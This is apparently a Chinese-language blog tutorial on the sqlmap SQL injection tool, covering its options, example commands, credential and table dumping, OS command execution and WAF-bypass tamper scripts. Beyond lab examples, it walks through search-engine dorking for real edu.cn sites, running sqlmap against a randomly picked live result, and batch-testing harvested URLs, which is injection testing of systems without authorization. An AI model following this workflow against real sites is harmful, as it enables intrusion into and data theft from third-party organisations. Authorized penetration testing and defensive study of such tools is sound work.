<li><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>​        sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，日前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。sqlmap的功能强大到让你惊叹，常规注入工具不能绕过的话，终极使用sqlmap会有意想不到的效果。</p>
</li>
<li><h4 id="Sqlmap是什么"><a href="#Sqlmap是什么" class="headerlink" title="Sqlmap是什么"></a>Sqlmap是什么</h4><ol>
<li>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。</li>
<li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</li>
<li>在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。</li>
<li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li>
<li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li>
<li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li>
<li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li>
<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。</li>
<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。</li>
</ol>
</li>
<li><h4 id="下载安装sqlmap"><a href="#下载安装sqlmap" class="headerlink" title="下载安装sqlmap"></a>下载安装sqlmap</h4><ol>
<li><p>linux下git直接安装</p>
<p>gitclone –depth 1 <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
</li>
<li><p>windows下安装</p>
<p>windows下下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。</p>
</li>
<li><p>kali及PentestBox默认安装sqlmap</p>
<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpjs0h3j30ka0cs3zz.jpg" alt="image-20200401131519983"></p>
</li>
</ol>
</li>
<li><h4 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h4><ol>
<li><h5 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h5><ol>
<li><p>-h,–help 显示基本帮助信息并退出</p>
<p>-hh  显示高级帮助信息并退出</p>
<p>–version 显示程序版本信息并退出</p>
<p>-v VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</p>
</li>
</ol>
</li>
<li><h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ol>
<li><p>-d DIRECT  直接连接数据库的连接字符串</p>
<p>-u URL, –url=URL  目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1“)，使用-u或者–url" target="_blank" rel="noopener">http://www.site.com/vuln.php?id=1“)，使用-u或者–url</a></p>
<p>-l LOGFILE   从Burp或者WebScarab代理日志文件中分析目标</p>
<p>-x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标</p>
<p>-m BULKFILE   将目标地址保存在文件中，一行为一个URL地址进行批量检测。</p>
<p>-r REQUESTFILE  从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</p>
<p>-g GOOGLEDORK   从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
<p>-c CONFIGFILE    从配置ini文件中加载选项</p>
</li>
</ol>
</li>
<li><h5 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h5><ol>
<li><p>这些选项可以用来指定如何连接到目标URL</p>
<p>–method=METHOD  强制使用给定的HTTP方法（例如put）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--data&#x3D;DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data&#x3D;&quot;id&#x3D;1&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure>

<p>  –param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
<p>  –cookie=COOKIE   HTTP Cookieheader 值</p>
<p>  –cookie-del=COO.. 用来分隔cookie的字符串值</p>
<p>  –load-cookies=L.. Filecontaining cookies in Netscape/wget format</p>
<p>  –drop-set-cookie  IgnoreSet-Cookie header from response</p>
<p>  –user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org</a>)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</p>
<p>  –random-agent   使用random-agent作为HTTP User-Agent头值</p>
<p>  –host=HOST     HTTP Hostheader value</p>
<p>  –referer=REFERER  sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p>
<p>  -H HEADER, –hea.. 额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)</p>
<p>  –headers=HEADERS 可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)</p>
<p>  –auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p>
<p>  –auth-cred=AUTH.. HTTP 认证凭证(name:password)</p>
<p>  –auth-file=AUTH.. HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
<p>  –ignore-401    Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p>
<p>  –ignore-proxy   忽略系统的默认代理设置</p>
<p>  –ignore-redirects忽略重定向的尝试</p>
<p>  –ignore-timeouts  忽略连接超时</p>
<p>  –proxy=PROXY    使用代理服务器连接到目标URL</p>
<p>  –proxy-cred=PRO.. 代理认证凭证(name:password)</p>
<p>  –proxy-file=PRO.. 从文件加载代理列表</p>
<p>  –tor        使用Tor匿名网络</p>
<p>  –tor-port=TORPORT 设置Tor代理端口</p>
<p>  –tor-type=TORTYPE 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p>
<p>  –check-tor    检查Tor的是否正确使用</p>
<p>  –delay=DELAY  可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<p>  –timeout=TIMEOUT  可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p>
<p>  –retries=RETRIES  当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
<p>  –randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p>
<p>  –safe-url=SAFEURL 提供一个安全不错误的连接，每隔一段时间都会去访问一下</p>
<p>  –safe-post=SAFE.. 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p>
<p>  –safe-req=SAFER.. 从文件中加载安全HTTP请求</p>
<p>  –safe-freq=SAFE.. 测试一个给定安全网址的两个访问请求</p>
<p>  –skip-urlencode  跳过URL的有效载荷数据编码</p>
<p>  –csrf-token=CSR.. Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</p>
<p>  –csrf-url=CSRFURL URL地址访问提取anti-CSRF令牌</p>
<p>  –force-ssl     强制使用SSL/HTTPS</p>
<p>  –hpp        使用HTTP参数污染的方法</p>
<p>  –eval=EVALCODE   在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p>
<p> sqlmap -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</p>
</li>
</ol>
</li>
<li><h5 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h5><ol>
<li><p>-o        打开所有的优化开关</p>
<p>–predict-output  预测普通查询输出</p>
<p>–keep-alive    使用持久HTTP（S）连接</p>
<p>–null-connection  获取页面长度</p>
<p>–threads=THREADS  当前http(s)最大请求数 (默认 1)</p>
</li>
</ol>
</li>
<li><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><ol>
<li><p>-p TESTPARAMETER  可测试的参数</p>
<p>–skip=SKIP     跳过对给定参数的测试</p>
<p>–skip-static    跳过测试不显示为动态的参数</p>
<p>–param-exclude=.. 使用正则表达式排除参数进行测试（e.g. “ses”）</p>
<p>–dbms=DBMS     强制后端的DBMS为此值</p>
<p>–dbms-cred=DBMS.. DBMS认证凭证(user:password)</p>
<p>–os=OS      强制后端的DBMS操作系统为这个值</p>
<p>–invalid-bignum  使用大数字使值无效</p>
<p>–invalid-logical  使用逻辑操作使值无效</p>
<p>–invalid-string  使用随机字符串使值无效</p>
<p>–no-cast     关闭有效载荷铸造机制</p>
<p>–no-escape     关闭字符串逃逸机制</p>
<p>–prefix=PREFIX   注入payload字符串前缀</p>
<p>–suffix=SUFFIX   注入payload字符串后缀</p>
<p>–tamper=TAMPER  使用给定的脚本篡改注入数据</p>
</li>
</ol>
</li>
<li><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ol>
<li><p>–level=LEVEL   执行测试的等级（1-5，默认为1）</p>
<p> –risk=RISK    执行测试的风险（0-3，默认为1）</p>
<p> –string=STRING  查询时有效时在页面匹配字符串</p>
<p> –not-string=NOT.. 当查询求值为无效时匹配的字符串</p>
<p> –regexp=REGEXP   查询时有效时在页面匹配正则表达式</p>
<p> –code=CODE    当查询求值为True时匹配的HTTP代码</p>
<p> –text-only    仅基于在文本内容比较网页</p>
<p> –titles      仅根据他们的标题进行比较</p>
</li>
</ol>
</li>
<li><h5 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h5><ol>
<li><p>–technique=TECH  SQL注入技术测试（默认BEUST）</p>
<p>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
<p>–union-cols=UCOLS 定列范围用于测试UNION查询注入</p>
<p>–union-char=UCHAR 暴力猜测列的字符数</p>
<p>–union-from=UFROM SQL注入UNION查询使用的格式</p>
<p>–dns-domain=DNS.. DNS泄露攻击使用的域名</p>
<p>–second-order=S.. URL搜索产生的结果页面</p>
</li>
</ol>
</li>
<li><h5 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h5><ol>
<li>-f, –fingerprint  执行广泛的DBMS版本指纹检查</li>
</ol>
</li>
<li><h5 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h5><ol>
<li><p>-a, –all      获取所有信息</p>
<p> -b, –banner    获取数据库管理系统的标识</p>
<p> –current-user   获取数据库管理系统当前用户</p>
<p> –current-db    获取数据库管理系统当前数据库</p>
<p> –hostname     获取数据库服务器的主机名称</p>
<p> –is-dba      检测DBMS当前用户是否DBA</p>
<p> –users       枚举数据库管理系统用户</p>
<p> –passwords     枚举数据库管理系统用户密码哈希</p>
<p> –privileges    枚举数据库管理系统用户的权限</p>
<p> –roles      枚举数据库管理系统用户的角色</p>
<p> –dbs       枚举数据库管理系统数据库</p>
<p> –tables      枚举的DBMS数据库中的表</p>
<p> –columns     枚举DBMS数据库表列</p>
<p> –schema      枚举数据库架构</p>
<p> –count       检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap -u url –count -D testdb</p>
<p> –dump      转储数据库表项</p>
<p> –dump-all     转储数据库所有表项</p>
<p> –search      搜索列（S），表（S）和/或数据库名称（S）</p>
<p> –comments     获取DBMS注释</p>
<p> -D DB        要进行枚举的指定数据库名</p>
<p> -T TBL       DBMS数据库表枚举</p>
<p> -C COL       DBMS数据库表列枚举</p>
<p> -X EXCLUDECOL   DBMS数据库表不进行枚举</p>
<p> -U USER      用来进行枚举的数据库用户</p>
<p> –exclude-sysdbs  枚举表时排除系统数据库</p>
<p> –pivot-column=P.. Pivot columnname</p>
<p> –where=DUMPWHERE  Use WHEREcondition while table dumping</p>
<p> –start=LIMITSTART 获取第一个查询输出数据位置</p>
<p> –stop=LIMITSTOP  获取最后查询的输出数据</p>
<p> –first=FIRSTCHAR  第一个查询输出字的字符获取</p>
<p> –last=LASTCHAR  最后查询的输出字字符获取</p>
<p> –sql-query=QUERY  要执行的SQL语句</p>
<p> –sql-shell     提示交互式SQL的shell</p>
<p> –sql-file=SQLFILE 要执行的SQL文件</p>
</li>
</ol>
</li>
<li><h5 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h5><ol>
<li><p>–common-tables   检查存在共同表</p>
<p> –common-columns  检查存在共同列</p>
</li>
</ol>
</li>
<li><h5 id="自定义函数注入"><a href="#自定义函数注入" class="headerlink" title="自定义函数注入"></a>自定义函数注入</h5><ol>
<li><p>–udf-inject  注入用户自定义函数</p>
<p> –shared-lib=SHLIB 共享库的本地路径</p>
</li>
</ol>
</li>
<li><h5 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h5><ol>
<li><p>–file-read=RFILE  从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:</p>
<p>sqlmap -u”<a href="http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read</a> “C:/example.exe” -v 1</p>
<p>  –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</p>
<p>  –file-dest=DFILE  后端的数据库管理系统写入文件的绝对路径</p>
</li>
</ol>
</li>
<li><h5 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h5><ol>
<li><p>–os-cmd=OSCMD  执行操作系统命令（OSCMD）</p>
<p>–os-shell     交互式的操作系统的shell</p>
<p>–os-pwn     获取一个OOB shell，meterpreter或VNC</p>
<p>–os-smbrelay    一键获取一个OOBshell，meterpreter或VNC</p>
<p>–os-bof      存储过程缓冲区溢出利用</p>
<p>–priv-esc     数据库进程用户权限提升</p>
<p>–msf-path=MSFPATH MetasploitFramework本地的安装路径</p>
<p>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
</li>
<li><p>linux查看当前用户命令：</p>
<p>sqlmap -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –os-cmd id -v1</p>
</li>
</ol>
</li>
<li><h5 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h5><ol>
<li><p>–reg-read     读一个Windows注册表项值</p>
<p>–reg-add      写一个Windows注册表项值数据</p>
<p>–reg-del      删除Windows注册表键值</p>
<p>–reg-key=REGKEY  Windows注册表键</p>
<p>–reg-value=REGVAL Windows注册表项值</p>
<p>–reg-data=REGDATA Windows注册表键值数据</p>
<p>–reg-type=REGTYPE Windows注册表项值类型</p>
</li>
</ol>
</li>
<li><h5 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h5><ol>
<li><h5 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h5><p>参数：–technique</p>
<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>

<h5 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h5><p>参数：–time-sec</p>
<p>当使用基于时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p>
<h5 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h5><p>参数：–union-cols</p>
<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
<h5 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h5><p>参数：–union-char</p>
<p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。</p>
<h5 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h5><p>参数：–second-order</p>
<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p>
</li>
</ol>
</li>
<li><h5 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h5><ol>
<li><p>-s SESSIONFILE   保存和恢复检索会话文件的所有数据</p>
<p>-t TRAFFICFILE   记录所有HTTP流量到一个文本文件中</p>
<p>–batch      从不询问用户输入，使用所有默认配置。</p>
<p>–binary-fields=.. 结果字段具有二进制值(e.g.”digest”)</p>
<p>–charset=CHARSET  强制字符编码</p>
<p>–crawl=CRAWLDEPTH 从目标URL爬行网站</p>
<p>–crawl-exclude=.. 正则表达式从爬行页中排除</p>
<p>–csv-del=CSVDEL  限定使用CSV输出 (default”,”)</p>
<p>–dump-format=DU.. 转储数据格式(CSV(default), HTML or SQLITE)</p>
<p>–eta       显示每个输出的预计到达时间</p>
<p>–flush-session   刷新当前目标的会话文件</p>
<p>–forms      解析和测试目标URL表单</p>
<p>–fresh-queries   忽略在会话文件中存储的查询结果</p>
<p>–hex       使用DBMS Hex函数数据检索</p>
<p>–output-dir=OUT.. 自定义输出目录路径</p>
<p>–parse-errors   解析和显示响应数据库错误信息</p>
<p>–save=SAVECONFIG  保存选项到INI配置文件</p>
<p>–scope=SCOPE  从提供的代理日志中使用正则表达式过滤目标</p>
<p>–test-filter=TE.. 选择测试的有效载荷和/或标题(e.g. ROW)</p>
<p>–test-skip=TEST.. 跳过试验载荷和/或标题(e.g.BENCHMARK)</p>
<p>–update      更新sqlmap</p>
</li>
</ol>
</li>
<li><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ol>
<li><p>-z MNEMONICS    使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</p>
<p>–alert=ALERT    发现SQL注入时，运行主机操作系统命令</p>
<p>–answers=ANSWERS  当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap -u”<a href="http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”" target="_blank" rel="noopener">http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”</a> –batch</p>
<p>–beep  发现sql注入时，发出蜂鸣声。</p>
<p>–cleanup   清除sqlmap注入时在DBMS中产生的udf与表。</p>
<p>–dependencies   Check formissing (non-core) sqlmap dependencies</p>
<p>–disable-coloring 默认彩色输出，禁掉彩色输出。</p>
<p>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</p>
<p>–identify-waf   进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</p>
<p>–mobile   有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p>
<p>–offline      Work inoffline mode (only use session data)</p>
<p>–purge-output   从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
<p>–skip-waf      跳过WAF／IPS / IDS启发式检测保护</p>
<p>–smart      进行积极的启发式测试，快速判断为注入的报错点进行注入</p>
<p>–sqlmap-shell   互动提示一个sqlmapshell</p>
<p>–tmp-dir=TMPDIR  用于存储临时文件的本地目录</p>
<p>–web-root=WEBROOT Web服务器的文档根目录(e.g.”/var/www”)</p>
<p>–wizard  新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</p>
</li>
</ol>
</li>
</ol>
</li>
<li><h3 id="sqlmap实际利用"><a href="#sqlmap实际利用" class="headerlink" title="sqlmap实际利用"></a>sqlmap实际利用</h3><ol>
<li><h4 id="检测和利用SQL注入"><a href="#检测和利用SQL注入" class="headerlink" title="检测和利用SQL注入"></a>检测和利用SQL注入</h4><ol>
<li><h5 id="手工判断是否存在漏洞"><a href="#手工判断是否存在漏洞" class="headerlink" title="手工判断是否存在漏洞"></a>手工判断是否存在漏洞</h5><ol>
<li><p>对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。</p>
<p>原始网页：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>构造url1：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</a></p>
<p>构造url2：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</a></p>
<p>如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。</p>
</li>
<li><h5 id="sqlmap自动检测"><a href="#sqlmap自动检测" class="headerlink" title="sqlmap自动检测"></a>sqlmap自动检测</h5><ol>
<li>检测语法：sqlmap -u <a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></li>
</ol>
<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。</p>
</li>
<li><h5 id="寻找和判断"><a href="#寻找和判断" class="headerlink" title="寻找和判断"></a>寻找和判断</h5><ol>
<li>通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn，如图1所示。随机打开一个网页搜索结果，如图所示，如果能够正常访问，则复制该URL地址。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpvrzfhj30cs0b4758.jpg" alt="超详细SQLMap使用攻略及技巧"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpzhg3yj30e807sq3d.jpg" alt="图2测试网页能否正常访问.jpg"></p>
<p>将该url使用sqlmap进行注入测试，如图3所示，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。本例中是不存在SQL注入漏洞。</p>
</li>
<li><h5 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h5><ol>
<li>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrq62op2j30i009876b.jpg" alt="图4批量整理目标地址.jpg"></p>
</li>
</ol>
</li>
</ol>
</li>
<li><h4 id="直接连接数据库"><a href="#直接连接数据库" class="headerlink" title="直接连接数据库"></a>直接连接数据库</h4><ol>
<li>sqlmap -d”mysql://admin:<a href="mailto:admin@192.168.21.17">admin@192.168.21.17</a>:3306/testdb” -f –banner –dbs–users</li>
</ol>
</li>
<li><h4 id="数据库相关操作"><a href="#数据库相关操作" class="headerlink" title="数据库相关操作"></a>数据库相关操作</h4><p>1.列数据库信息：–dbs</p>
<p>2.web当前使用的数据库–current-db</p>
<p>3.web数据库使用账户–current-user</p>
<p>4.列出sqlserver所有用户 –users</p>
<p>5.数据库账户与密码 –passwords</p>
<p>6.指定库名列出所有表  -D database –tables</p>
<p>-D：指定数据库名称</p>
<p>7.指定库名表名列出所有字段 -D antian365-T admin –columns</p>
<p>-T：指定要列出字段的表</p>
<p>8.指定库名表名字段dump出指定字段</p>
<p>-D secbang_com -T admin -C id,password ,username –dump</p>
<p>-D antian365 -T userb -C”email,Username,userpassword” –dump</p>
<p> 可加双引号，也可不加双引号。</p>
<p>9.导出多少条数据</p>
<p>-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump </p>
<p>参数：</p>
<p>–start：指定开始的行</p>
<p>–stop：指定结束的行</p>
<p>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</p>
</li>
</ol>
</li>
<li><h3 id="SQLMAP实用技巧"><a href="#SQLMAP实用技巧" class="headerlink" title="SQLMAP实用技巧"></a>SQLMAP实用技巧</h3><ol>
<li><h4 id="mysql的注释方法进行绕过WAF进行SQL注入"><a href="#mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="mysql的注释方法进行绕过WAF进行SQL注入"></a>mysql的注释方法进行绕过WAF进行SQL注入</h4><ol>
<li><p>修改C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py</p>
<p>return match.group().replace(word,”/*!0%s” % word) 为：</p>
<p>return match.group().replace(word,”/<em>!50000%s</em>/” % word)</p>
</li>
<li><p>修改C:\Python27\sqlmap\xml\queries.xml</p>
<p>&lt;cast query=”CAST(%s ASCHAR)”/&gt;为：</p>
<p>&lt;castquery=”convert(%s,CHAR)”/&gt;</p>
</li>
<li><p>使用sqlmap进行注入测试</p>
<p>sqlmap -u”http://**.com/detail.php? id=16″ –tamper “halfversionedmorekeywords.py”</p>
<p>其它绕过waf脚本方法：</p>
<p>sqlmap-u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”</a> –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</p>
</li>
<li><p>tamper目录下文件具体含义：</p>
<ol>
<li><p>space2comment.py用/**/代替空格</p>
<p>apostrophemask.py用utf8代替引号</p>
<p>equaltolike.pylike代替等号</p>
<p>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</p>
<p>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</p>
<p>space2hash.py空格替换为#号,随机字符串以及换行符</p>
<p>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</p>
<p>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p>
<p>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</p>
<p>appendnullbyte.py在有效负荷结束位置加载零字节字符编码</p>
<p>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</p>
<p>space2mssqlblank.py(mssql)空格替换为其它空符号</p>
<p>base64encode.py　用base64编码替换</p>
<p>space2mssqlhash.py　替换空格</p>
<p>modsecurityversioned.py过滤空格，包含完整的查询版本注释</p>
<p>space2mysqlblank.py　空格替换其它空白符号(mysql)</p>
<p>between.py用between替换大于号（&gt;）</p>
<p>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p>
<p>multiplespaces.py围绕SQL关键字添加多个空格</p>
<p>space2plus.py用+替换空格</p>
<p>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like</p>
<p>nonrecursivereplacement.py双重查询语句,取代SQL关键字</p>
<p>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
<p>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p>
<p>chardoubleencode.py双url编码(不处理以编码的)</p>
<p>unionalltounion.py替换UNION ALLSELECT UNION SELECT</p>
<p>charencode.py　url编码</p>
<p>randomcase.py随机大小写</p>
<p>unmagicquotes.py宽字符绕过 GPCaddslashes</p>
<p>randomcomments.py用/**/分割sql关键字</p>
<p>charunicodeencode.py字符串 unicode 编码</p>
<p>securesphere.py追加特制的字符串</p>
<p>versionedmorekeywords.py注释绕过</p>
<p>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</p>
<p>halfversionedmorekeywords.py关键字前加注释</p>
</li>
</ol>
</li>
</ol>
</li>
